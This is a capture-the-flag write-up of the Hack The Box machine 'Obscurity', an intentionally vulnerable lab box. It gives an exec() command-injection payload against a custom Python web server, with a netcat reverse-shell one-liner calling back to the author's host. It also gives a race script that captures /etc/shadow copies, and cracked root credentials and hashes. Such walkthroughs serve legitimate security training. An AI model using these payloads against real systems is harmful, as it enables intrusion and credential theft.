---
layout: post
title: "[HTB] Obscurity - write up"
published: true
date: 2020-03-28
description:  This box is quite fun. it is of medium difficulty. You'll need to do some reverse engineering of python scripts, in order to inject commands. Then there is a cryptography scheme to break which is quite easy because both the cipher and clear text are given. Then again you need to understand what another script is doing in order to act fast and capture the creds before it's too late.
img: posts/obscurity/obscurity_logo.png # Add image post (optional)
tags: [Reverse engineering, Python, Scripting, Crypto, Enumeration, BurpSuite, Reverse shell, HTB, Medium] # add tag
os: Linux
difficulty: Medium
points: 30
release: 2019-11-30
ip: 10.10.10.168
---

# Summary:

{{ page.description }}

### Foothold:

```sh
$#nmap -sC -sV -oA nmap/default 10.10.10.168
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-28 19:16 CET
Nmap scan report for obscure.htb (10.10.10.168)
Host is up (0.085s latency).
Not shown: 996 filtered ports
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)
|   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)
|_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)
80/tcp   closed http
8080/tcp open   http-proxy BadHTTPServer
| fingerprint-strings:
|   GetRequest, HTTPOptions:
|     HTTP/1.1 200 OK
|     Date: Sat, 28 Mar 2020 18:19:03
|     Server: BadHTTPServer
|     Last-Modified: Sat, 28 Mar 2020 18:19:03
|     Content-Length: 4171
|     Content-Type: text/html
|     Connection: Closed
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>0bscura</title>
|     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta name="keywords" content="">
|     <meta name="description" content="">
|     <!--
|     Easy Profile Template
|     http://www.templatemo.com/tm-467-easy-profile
|     <!-- stylesheet css -->
|     <link rel="stylesheet" href="css/bootstrap.min.css">
|     <link rel="stylesheet" href="css/font-awesome.min.css">
|     <link rel="stylesheet" href="css/templatemo-blue.css">
|     </head>
|     <body data-spy="scroll" data-target=".navbar-collapse">
|     <!-- preloader section -->
|     <!--
|     <div class="preloader">
|_    <div class="sk-spinner sk-spinner-wordpress">
|_http-server-header: BadHTTPServer
|_http-title: 0bscura
9000/tcp closed cslistener
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint
at https://nmap.org/cgi-bin/submit.cgi?new-service :
[...]
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.85 seconds
```

The classic `22/ssh` is open. However, `http/80` is closed. Nevertheless, there is a website on `8080` and `nmap` showes us the head of the html. Stating the server-header is **BadHTTPServer**, that's weird. The last port stated in `9000/tcp` which is closed. We get some information that this is a Linux machine and then a big fingerprint which I removed as not useful here.

Let's look at the website. It is apparently a cybersecurity service. The description of the service is quite insightful:

> ## 0bscura
>
> Here at 0bscura, we take a unique approach to security: you can't be hacked if attackers don't know what software you're using!
>
> That's why our motto is 'security through obscurity'; we  write all our own software from scratch, even the webserver this is  running on! This means that no exploits can possibly exist for it, which means it's totally secure!

Apparently it is not a common server. So as they say, we won't be able to find CVE exploits. However, they have to be pretty good to propose their own server program. This type of service is prone to 0-day.

Another interesting information is in the next paragraph

> ## Our Software
>
> Our suite of custom software currently includes:
>
> **A custom written web server**																												  70%
>
> Currently resolving minor stability issues; server will restart if it hangs for 30 seconds
> **An unbreakable encryption algorithm**																								  85%
>
> **A more secure replacement to SSH**																										95%

This tells use that their services are not finished. Next paragraph:

> ## Contact
>
>  123 Rama IX Road, Bangkok
>
>  010-020-0890
>
>  secure@obscure.htb
>
>  obscure.htb

We get an email and a url which we can add to our `/etc/hosts`

```sh
$cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       parrot
10.10.10.168    obscure.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

And last paragraph

> ## Development
>
> #### Server Dev
>
> Message to server devs: the  current source code for the web server is in 'SuperSecureServer.py' in  the secret development directory

This last message tells us that we are looking for a specific file, in a secret development directory. Ok let's fire `ffuf` and see if we can find something. We do not find anything at all like this though. For a shot in the dark, if there is only one sub-folder which contains a known existing file we can scan for **http://domain/[unknown]/file.py** This is where ffuf is pretty good since it is more flexible than dirb or gobuster, and much faster.

```sh
$~/Git/ffuf/ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://obscure.htb:8080/FUZZ/SuperSecureServer.py -o default

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://obscure.htb:8080/FUZZ/SuperSecureServer.py
 :: Output file      : default
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

develop                 [Status: 200, Size: 5892, Words: 1806, Lines: 171]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

I prematurely interrupted the script as we had a hit. Lets visit this webpage: **http://obscure.htb:8080/develop/SuperSecureServer.py**
We can copy the file to our local machine and we can investigate it.

```python
import socket
import threading
from datetime import datetime
import sys
import os
import mimetypes
import urllib.parse
import subprocess

respTemplate = """HTTP/1.1 {statusNum} {statusCode}
Date: {dateSent}
Server: {server}
Last-Modified: {modified}
Content-Length: {length}
Content-Type: {contentType}
Connection: {connectionType}

{body}
"""
DOC_ROOT = "DocRoot"

CODES = {"200": "OK",
        "304": "NOT MODIFIED",
        "400": "BAD REQUEST", "401": "UNAUTHORIZED", "403": "FORBIDDEN", "404": "NOT FOUND",
        "500": "INTERNAL SERVER ERROR"}

MIMES = {"txt": "text/plain", "css":"text/css", "html":"text/html", "png": "image/png", "jpg":"image/jpg",
        "ttf":"application/octet-stream","otf":"application/octet-stream", "woff":"font/woff", "woff2": "font/woff2",
        "js":"application/javascript","gz":"application/zip", "py":"text/plain", "map": "application/octet-stream"}


class Response:
    def __init__(self, **kwargs):
        self.__dict__.update(kwargs)
        now = datetime.now()
        self.dateSent = self.modified = now.strftime("%a, %d %b %Y %H:%M:%S")
    def stringResponse(self):
        return respTemplate.format(**self.__dict__)

class Request:
    def __init__(self, request):
        self.good = True
        try:
            request = self.parseRequest(request)
            self.method = request["method"]
            self.doc = request["doc"]
            self.vers = request["vers"]
            self.header = request["header"]
            self.body = request["body"]
        except:
            self.good = False

    def parseRequest(self, request):
        req = request.strip("\r").split("\n")
        method,doc,vers = req[0].split(" ")
        header = req[1:-3]
        body = req[-1]
        headerDict = {}
        for param in header:
            pos = param.find(": ")
            key, val = param[:pos], param[pos+2:]
            headerDict.update({key: val})
        return {"method": method, "doc": doc, "vers": vers, "header": headerDict, "body": body}


class Server:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))

    def listen(self):
        self.sock.listen(5)
        while True:
            client, address = self.sock.accept()
            client.settimeout(60)
            threading.Thread(target = self.listenToClient,args = (client,address)).start()

    def listenToClient(self, client, address):
        size = 1024
        while True:
            try:
                data = client.recv(size)
                if data:
                    # Set the response to echo back the recieved data
                    req = Request(data.decode())
                    self.handleRequest(req, client, address)
                    client.shutdown()
                    client.close()
                else:
                    raise error('Client disconnected')
            except:
                client.close()
                return False

    def handleRequest(self, request, conn, address):
        if request.good:
#            try:
                # print(str(request.method) + " " + str(request.doc), end=' ')
                # print("from {0}".format(address[0]))
#            except Exception as e:
#                print(e)
            document = self.serveDoc(request.doc, DOC_ROOT)
            statusNum=document["status"]
        else:
            document = self.serveDoc("/errors/400.html", DOC_ROOT)
            statusNum="400"
        body = document["body"]

        statusCode=CODES[statusNum]
        dateSent = ""
        server = "BadHTTPServer"
        modified = ""
        length = len(body)
        contentType = document["mime"] # Try and identify MIME type from string
        connectionType = "Closed"


        resp = Response(
        statusNum=statusNum, statusCode=statusCode,
        dateSent = dateSent, server = server,
        modified = modified, length = length,
        contentType = contentType, connectionType = connectionType,
        body = body
        )

        data = resp.stringResponse()
        if not data:
            return -1
        conn.send(data.encode())
        return 0

    def serveDoc(self, path, docRoot):
        path = urllib.parse.unquote(path)
        try:
            info = "output = 'Document: {}'" # Keep the output for later debug
            exec(info.format(path)) # This is how you do string formatting, right?
            cwd = os.path.dirname(os.path.realpath(__file__))
            docRoot = os.path.join(cwd, docRoot)
            if path == "/":
                path = "/index.html"
            requested = os.path.join(docRoot, path[1:])
            if os.path.isfile(requested):
                mime = mimetypes.guess_type(requested)
                mime = (mime if mime[0] != None else "text/html")
                mime = MIMES[requested.split(".")[-1]]
                try:
                    with open(requested, "r") as f:
                        data = f.read()
                except:
                    with open(requested, "rb") as f:
                        data = f.read()
                status = "200"
            else:
                errorPage = os.path.join(docRoot, "errors", "404.html")
                mime = "text/html"
                with open(errorPage, "r") as f:
                    data = f.read().format(path)
                status = "404"
        except Exception as e:
            print(e)
            errorPage = os.path.join(docRoot, "errors", "500.html")
            mime = "text/html"
            with open(errorPage, "r") as f:
                data = f.read()
            status = "500"
        return {"body": data, "mime": mime, "status": status}
```

So apparently this is the entire script for the server. It's not well documented, this means that the few comments must be leftovers of a lazy (like me) programmer. Looking around there is one really **REALLY** interesting snippet.

```python
info = "output = 'Document: {}'" # Keep the output for later debug
exec(info.format(path)) # This is how you do string formatting, right?
```

Indeed, `exec()` allows one to execute a command. The added comments are a bit CTF like but still. This command is basically used to get `output = 'Document: path'`. Not sure why it was done this way. But stupider things have been done. So what it does is add the content of `path` to `info`. For example

```python
>>> path = "foo"
>>> info = "output = 'Document: {}'"
>>> res = info.format(path)
>>> print(res)
ouput = 'Document: foo'
```

We can therefore easily inject a command if we add an extract quote

```python
>>> path = "',os.system(cmd),'"
>>> info = "output = 'Document: {}'"
>>> res = info.format(path)
>>> print(res)
output = 'Document: ',os.system(cmd),''
```

and this last line is what is executed. Now we want to know how we could inject this string. The variable `path`, is given as an argument when the function `serveDoc()` is called. It is then formatted using `urllib.parse.unquote(path)`. Not sure yet what this does, but we'll find out. Earlier in the `class` we see that `serverDoc()` is called with `request.doc` as an argument which is placed in `path`. Tracing it back, the object request was given in the mother function as `handleRequest()` as `request`.  Moving up this object is set as `req = Request(data.decode())`. The class `Request` parses the url and then `split` is done in the function `parseRequest()`.  It is important to understand this script. So what we'll do is write our own with only the parts of interest. The question we ask ourselves is

> What string must we write in the url to get a command executable in `exec()`?

Before we write our script we need an example request. The easiest way is to fire up BurpSuite and intercept a request which we can set as a variable.

``http
GET /index.html HTTP/1.1
Host: obscure.htb:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

We want to inject code after the `/index.html`. Lets write our script (python 3.7)

```python
import socket
import threading
from datetime import datetime
import sys
import os
import mimetypes
import urllib.parse
import subprocess

# WE IMPORT THE SAME IMPORTS AS IN THE SCRIPT
# This first function is there to format our request.
def parseRequest(request):
        req = request.strip("\r").split("\n")
        method,doc,vers = req[0].split(" ")
        header = req[1:-3]
        body = req[-1]
        headerDict = {}
        for param in header:
            pos = param.find(": ")
            key, val = param[:pos], param[pos+2:]
            headerDict.update({key: val})
        return {"method": method, "doc": doc, "vers": vers, "header": headerDict, "body": body}

# Second function which formats the doc as the server does, prints the doc that we can copy paste in our url, and check if it executes locally
def run(doc):
    path = urllib.parse.unquote(doc)

    info = "output = 'Document: {}'"
    d = info.format(path)
    print('')
    print(d)
    exec(d)

# One thing we see in the parseRequest is thatthe first line of the request is split on spaces to determine the method, doc, and vers, so we need to replace any space in our command with %20. We then pass our cmd through the pipeline and we can see the output
def htmlfreindly(cmd):
    shell = str(cmd).replace(" ", "%20")
    inject = f"os.system('{shell}')"
    code = f"/index.html',{inject},'"

    req = f"""GET {code} HTTP/1.1
    Host: obscure.htb:8080
    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    DNT: 1
    Connection: close
    Upgrade-Insecure-Requests: 1
    Cache-Control: max-age=0"""

    data = parseRequest(req)
    print(data)
    print('')
    print("COPY THIS:: ",code)# this actually prints the code to copy
    run(data['doc'])


htmlfreindly('ls')
```

In the script above, you can read the comments to get a small understanding of what it does. It's what I call a bin script (no, bin does not stand for binary, just bin as what you but your garbage in). Nevertheless if we run it with `ls`, here's the output on my local machine.

```sh
$python3 sandbox.py
{'method': 'GET', 'doc': "/index.html',os.system('rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202>&1|nc%2010.10.14.149%201231%20>/tmp/f'),'", 'vers': 'HTTP/1.1', 'header': {'    Host': 'obscure.htb:8080', '    User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0', '    Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', '    Accept-Language': 'en-US,en;q=0.5', '    Accept-Encoding': 'gzip, deflate', '    DNT': '1'}, 'body': '    Cache-Control: max-age=0'}

COPY THIS::  /index.html',os.system('ls'),'

output = 'Document: /index.html',os.system('ls'),''
ffuf  nmap  sandbox.py  stuff.txt  SuperSecureServer.py  testinject.py  wordlist1.  writeUp
```

Ok so it seams to work. Now we can play around and and test commands. In order to easily test them on the target website, we'll use Burpsuit and the repeater mode and just change the first line of the request.

```http
[REQUEST]
GET /index.html',os.system('ls'),' HTTP/1.1
Host: obscure.htb:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
If-Modified-Since: Sat, 28 Mar 2020 20:56:36


[RESPONSE]
HTTP/1.1 404 NOT FOUND
Date: Sat, 28 Mar 2020 21:02:56
Server: BadHTTPServer
Last-Modified: Sat, 28 Mar 2020 21:02:56
Content-Length: 196
Content-Type: text/html
Connection: Closed


<div id="main">
    	<div class="fof">
                <h1>Error 404</h1>
                <h2>Document /index.html',os.system('ls'),' could not be found</h2>
    	</div>
</div>
```

By running the `ls` command in request, we get a **404** response. Is that good? Well looking at the original python code, we see that if a **404** is triggered, well that `exec` was run and the command succeeded, otherwise we would have had a **500** response.

Ok so now we can try to get a reverse shell.

```python
htmlfreindly('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.149 1231 >/tmp/f')

[...]

COPY THIS::  /index.html',os.system('rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202>&1|nc%2010.10.14.149%201231%20>/tmp/f'),'

```

Before sending this through burp, we need to setup a listener. and once `nc` is listening we hit the repeat button and:

```sh
$nc -lvnp 1231
listening on [any] 1231 ...
connect to [10.10.14.149] from (UNKNOWN) [10.10.10.168] 36578
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$
```
Voilà ! We just need to augment the shell to something decent.

```sh
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@obscure:/$

[ctrl+z]
$ stty raw -echo
$ fg [enter x2]

www-data@obscure:/$
```

With this little command we get a proper shell with tabs, arrows etc.. Let's get user!

# User

Looking at the home directory, we see that the only user is `robert` (no secure as we might have though with the email). In its directory, there are multiple files, let's check the all

```sh
www-data@obscure:/home/robert$ ls -al
total 60
drwxr-xr-x 7 robert robert 4096 Dec  2 09:53 .
drwxr-xr-x 3 root   root   4096 Sep 24  2019 ..
lrwxrwxrwx 1 robert robert    9 Sep 28 23:28 .bash_history -> /dev/null
-rw-r--r-- 1 robert robert  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 robert robert 3771 Apr  4  2018 .bashrc
drwxr-xr-x 2 root   root   4096 Dec  2 09:47 BetterSSH
drwx------ 2 robert robert 4096 Oct  3 16:02 .cache
-rw-rw-r-- 1 robert robert   94 Sep 26  2019 check.txt
drwxr-x--- 3 robert robert 4096 Dec  2 09:53 .config
drwx------ 3 robert robert 4096 Oct  3 22:42 .gnupg
drwxrwxr-x 3 robert robert 4096 Oct  3 16:34 .local
-rw-rw-r-- 1 robert robert  185 Oct  4 15:01 out.txt
-rw-rw-r-- 1 robert robert   27 Oct  4 15:01 passwordreminder.txt
-rw-r--r-- 1 robert robert  807 Apr  4  2018 .profile
-rwxrwxr-x 1 robert robert 2514 Oct  4 14:55 SuperSecureCrypt.py
-rwx------ 1 robert robert   33 Sep 25  2019 user.txt
```

We have another python file which we'll copy on our local machine. We do not have permission fort `user.txt`. `out.txt` is gibberish, so is `passwordreminder.txt`. Lastly, `BetterSSH` also has a python script. We can also read the `check.txt` file.

```sh
www-data@obscure:/home/robert$ cat check.txt
Encrypting this file with your key should result in out.txt, make sure your key is correct!
```

Ok so the `out.txt` file might be a way to check our result. Let's begin and copy everything locally. The method is to use base64 it is simple and allows to keep all characters, tabs, hex, etc...

```sh
[TARGET]
$ base64 file.txt > file.b64
$ cat file.b64
[COPY THE OUTPUT]

[LOCAL]
$ nano file.b64
[PASTE THE OUTPUT]
$ base64 -d file.b64 > file.txt
```

Anyway, Let's first focus on finding the password. Let's look at the `SuperSecureCrypt.py`.

```python
import sys
import argparse

def encrypt(text, key):
    keylen = len(key)
    keyPos = 0
    encrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr + ord(keyChr)) % 255)
        encrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return encrypted

def decrypt(text, key):
    keylen = len(key)
    keyPos = 0
    decrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr - ord(keyChr)) % 255)
        decrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return decrypted

parser = argparse.ArgumentParser(description='Encrypt with 0bscura\'s encryption algorithm')

parser.add_argument('-i',
                    metavar='InFile',
                    type=str,
                    help='The file to read',
                    required=False)

parser.add_argument('-o',
                    metavar='OutFile',
                    type=str,
                    help='Where to output the encrypted/decrypted file',
                    required=False)

parser.add_argument('-k',
                    metavar='Key',
                    type=str,
                    help='Key to use',
                    required=False)

parser.add_argument('-d', action='store_true', help='Decrypt mode')

args = parser.parse_args()

banner = "################################\n"
banner+= "#           BEGINNING          #\n"
banner+= "#    SUPER SECURE ENCRYPTOR    #\n"
banner+= "################################\n"
banner += "  ############################\n"
banner += "  #        FILE MODE         #\n"
banner += "  ############################"
print(banner)
if args.o == None or args.k == None or args.i == None:
    print("Missing args")
else:
    if args.d:
        print("Opening file {0}...".format(args.i))
        with open(args.i, 'r', encoding='UTF-8') as f:
            data = f.read()

        print("Decrypting...")
        decrypted = decrypt(data, args.k)

        print("Writing to {0}...".format(args.o))
        with open(args.o, 'w', encoding='UTF-8') as f:
            f.write(decrypted)
    else:
        print("Opening file {0}...".format(args.i))
        with open(args.i, 'r', encoding='UTF-8') as f:
            data = f.read()

        print("Encrypting...")
        encrypted = encrypt(data, args.k)

        print("Writing to {0}...".format(args.o))
        with open(args.o, 'w', encoding='UTF-8') as f:
            f.write(encrypted)
```

Ok so this file is a simple utility that manages the encryption of files. The `check.txt` tells us that when it is encrypted with the correct key we get the user.txt.

So let's try to understand if we can reverse the encryption, because we have an encrypted example, and its clear text as well as the equation. Unless it's some sort of hash, we can reverse it.

So looking at the encrypt function, we see we iterate through each character of the file to encrypt. We first take the first character of the key. Then, we convert the character to its unicode value. Then we add the this unicode with the unicode value of the key letter. We do a module 255 to limit the maximum value. and then we go to the next character both in the string to encode and in the key. but we loop the key over and over.

Lets run a small example (just made a little python script to utilise the function):

```sh
Chr  Uni   Enc   EncUni  Key  KeyUnicode
a    97    Ù     217     x    120
b    98    Û     219     y    121
c    99    Û     219     x    120
d    100   Ý     221     y    121
```

So for the first letter, we just add the unicode for 'a' and for 'x', so if we know the answer, we can simply substract the unicode for the encrypted character. If the substration leads (or led because it does happen) to a negative character, we just add 255 to the encoded unicode.

So what we need is a list of the unicode for both the `check.txt` file and for the `out.txt` file. To do that we can simply add `print(ord(x), end=' ')` in first place of the for loop and run the supperscript. Then we make a small script to substract both values


```python
out = """166 218 200 234 218 222 216 219 221 221 137 215 208 202 223 133 222 202 218 201 146 230 223 221 203 136 218 219 218 234 129 217 201 235 143 233 209 210 221 205 208 133 234 198 225 217 222 227 150 210 209 136 208 225 217 166 213 230 216 158 143 227 202 206 205 129 223 218 234 198 142 221 225 228 232 137 206 205 218 140 206 235 129 209 211 228 225 219 204 215 137 129 118""".split(" ")

check = """69 110 99 114 121 112 116 105 110 103 32 116 104 105 115 32 102 105 108 101 32 119 105 116 104 32 121 111 117 114 32 107 101 121 32 115 104 111 117 108 100 32 114 101 115 117 108 116 32 105 110 32 111 117 116 46 116 120 116 44 32 109 97 107 101 32 115 117 114 101 32 121 111 117 114 32 107 101 121 32 105 115 32 99 111 114 114 101 99 116 33 32 10""".split(" ")

i = 0
for x in out:
    decode = int(x) - int(check[i])
    print(chr(decode), end = "")

    i+=1
```

and here is the output

```sh
$python3 convert.py
alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichal
```

Great, we got the passphrase `alexandrovich`. Now we can decrypte the `passwordreminder.txt` using the give script.

```sh
$python3 SuperSecureCrypt.py -d -i passwordreminder.txt -k alexandrovich -o ps.decode
################################
#           BEGINNING          #
#    SUPER SECURE ENCRYPTOR    #
################################
  ############################
  #        FILE MODE         #
  ############################
Opening file passwordreminder.txt...
Decrypting...
Writing to ps.decode...

$cat ps.decode
SecThruObsFTW
```

Great this looks like a pretty good password, missing special characters and number but still. Let's try ssh to `robert` with this password.

```sh
$ssh robert@10.10.10.168
robert@10.10.10.168's password:
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Mar 28 23:52:54 UTC 2020

  System load:  0.01              Processes:             112
  Usage of /:   45.9% of 9.78GB   Users logged in:       0
  Memory usage: 8%                IP address for ens160: 10.10.10.168
  Swap usage:   0%


40 packages can be updated.
0 updates are security updates.


Last login: Mon Dec  2 10:23:36 2019 from 10.10.14.4
robert@obscure:~$ id
uid=1000(robert) gid=1000(robert) groups=1000(robert),4(adm),24(cdrom),30(dip),46(plugdev)
robert@obscure:~$ cat user.txt
e4493782066b55fe2755708736ada2d7
robert@obscure:~$
```

Success! we got _user_, let's go to root.

# Root

To get root, we can look at the BetterSSH.py file.

```python
import sys
import random, string
import os
import time
import crypt
import traceback
import subprocess

path = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
session = {"user": "", "authenticated": 0}
try:
    session['user'] = input("Enter username: ")
    passW = input("Enter password: ")

    with open('/etc/shadow', 'r') as f:
        data = f.readlines()
    data = [(p.split(":") if "$" in p else None) for p in data]
    passwords = []
    for x in data:
        if not x == None:
            passwords.append(x)

    passwordFile = '\n'.join(['\n'.join(p) for p in passwords])
    with open('/tmp/SSH/'+path, 'w') as f:
        f.write(passwordFile)
    time.sleep(.1)
    salt = ""
    realPass = ""
    for p in passwords:
        if p[0] == session['user']:
            salt, realPass = p[1].split('$')[2:]
            break

    if salt == "":
        print("Invalid user")
        os.remove('/tmp/SSH/'+path)
        sys.exit(0)
    salt = '$6$'+salt+'$'
    realPass = salt + realPass

    hash = crypt.crypt(passW, salt)

    if hash == realPass:
        print("Authed!")
        session['authenticated'] = 1
    else:
        print("Incorrect pass")
        os.remove('/tmp/SSH/'+path)
        sys.exit(0)
    os.remove(os.path.join('/tmp/SSH/',path))
except Exception as e:
    traceback.print_exc()
    sys.exit(0)

if session['authenticated'] == 1:
    while True:
        command = input(session['user'] + "@Obscure$ ")
        cmd = ['sudo', '-u',  session['user']]
        cmd.extend(command.split(" "))
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        o,e = proc.communicate()
        print('Output: ' + o.decode('ascii'))
        print('Error: '  + e.decode('ascii')) if len(e.decode('ascii')) > 0 else print('')
```

This program read the `/etc/shadow` file where the hashes for each users are stored. Moreover, it writes them in a file in `/tmp/SSH` in a randomly named file. It then does stuff and deletes the file. but it is slow (especially due to the `time.sleep(1)`)  So we just need to make a script which is faster that will look for new files in this folder and read the input. Lets create out script in the `/tmp` folder

```python
robert@obscure:/tmp$ cat grabber.py
import os
import time

while True:
    try:
        listdir = os.listdir('/tmp/SSH/')
        if listdir != []:
            os.system('cat /tmp/SSH/'+listdir[0])
            break
        else:
            pass

    except Exception as e:
        pass
    time.sleep(0.001)
```

Now we can create the SSH folder and run our script

```sh
robert@obscure:/tmp$ mkdir SSH
robert@obscure:/tmp$ python3 grabber.py
```

We open a second ssh with robert and we run the BetterSSH.py script

```sh
robert@obscure:~/BetterSSH$ python3 BetterSSH.py
Enter username: root
Enter password: test
Traceback (most recent call last):
  File "BetterSSH.py", line 15, in <module>
    with open('/etc/shadow', 'r') as f:
PermissionError: [Errno 13] Permission denied: '/etc/shadow'
```

Oh, of course, we must run this python as root. but can we?

```sh
robert@obscure:~/BetterSSH$ sudo -l
Matching Defaults entries for robert on obscure:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User robert may run the following commands on obscure:
    (ALL) NOPASSWD: /usr/bin/python3
        /home/robert/BetterSSH/BetterSSH.py
```

Yes we can. so we just first the command to execute

```sh
robert@obscure:~/BetterSSH$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
Enter username: root
Enter password: root
Incorrect pass
```

Ok this of course failed, but did our script catch something?

```sh
robert@obscure:/tmp/bob$ python3 grabber.py
root
$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1
18226
0
99999
7

robert
$6$fZZcDG7g$lfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XU.TCIHgavst7Lj8wLF/xQ21jYW5nD66aJsvQSP/y1zbH/
18163
0
99999
7
```

Yes! well, yes. We got the hashes for `robert` and root. We can ask john, we put root's hash in a hash named file on our local machine

```sh
$cat hash
$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1

$john hash
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
mercedes         (?)
1g 0:00:00:00 DONE 2/3 (2020-03-29 01:26) 4.000g/s 4096p/s 4096c/s 4096C/s crystal..random
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

We got a password: `mercedes`. Can we switch to root with this rubbish so CTF password? Yes!

```
robert@obscure:/tmp/bob$ su root
Password:
root@obscure:/tmp/bob# cd
root@obscure:~# id
uid=0(root) gid=0(root) groups=0(root)
root@obscure:~# cat root.txt
512fd4429f33a113a44d5acde23609e3
root@obscure:~#
```

Done !


**Guanicoe**


| name | hash |
| ------------- |:-------------:| -----:|
| root | $6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1 |
| robert  | $6$fZZcDG7g$lfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XU.TCIHgavst7Lj8wLF/xQ21jYW5nD66aJsvQSP/y1zbH/ |
